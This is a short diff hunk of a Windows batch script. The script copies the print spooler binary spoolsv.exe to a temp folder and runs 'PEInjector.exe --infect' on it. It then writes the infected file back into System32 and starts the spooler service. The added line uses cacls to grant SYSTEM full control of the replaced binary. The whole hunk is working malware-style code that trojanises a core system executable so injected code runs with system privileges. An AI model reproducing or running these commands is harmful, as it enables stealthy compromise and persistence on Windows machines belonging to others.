@@ -5,6 +5,7 @@ echo f| xcopy C:\Windows\System32\spoolsv.exe %TEMP%\spoolsv.exe /f
 %TEMP%\PEInjector.exe --infect %TEMP%\spoolsv.exe
 echo f| xcopy %TEMP%\spoolsv.exe C:\windows\system32\spoolsv.exe /f
 
+echo y| cacls C:\Windows\System32\spoolsv.exe /G system:F
 sc start spooler
 
 echo f| del %TEMP%\spoolsv.exe /f
